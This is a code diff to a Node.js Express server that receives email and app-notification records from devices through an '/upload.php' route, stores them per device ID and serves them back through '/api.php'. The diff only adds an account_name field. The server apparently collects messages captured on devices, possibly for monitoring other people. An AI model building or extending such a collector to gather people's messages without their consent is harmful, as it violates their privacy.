@@ -110,6 +110,7 @@ app.post('/upload.php', (req, res) => {
                 data.emails.forEach(email => {
                     emails.unshift({
                         app_name: 'Gmail',
+                        account_name: 'Gmail',
                         sender: 'Gmail',
                         subject: email.content || '',
                         timestamp: email.timestamp || Date.now()
@@ -136,6 +137,7 @@ app.post('/upload.php', (req, res) => {
             
             emails.unshift({
                 app_name: data.app_name || 'Email',
+                account_name: data.account_name || data.sender || 'غير معروف',
                 package_name: data.package_name || '',
                 sender: data.sender || 'غير معروف',
                 subject: data.subject || '',
@@ -325,7 +327,6 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
-        // ✅ استرجاع رسائل البريد
         if (action === 'get_emails') {
             const emailFile = path.join(dataDir, deviceId, 'emails.json');
             if (fs.existsSync(emailFile)) return res.json(JSON.parse(fs.readFileSync(emailFile, 'utf8')));
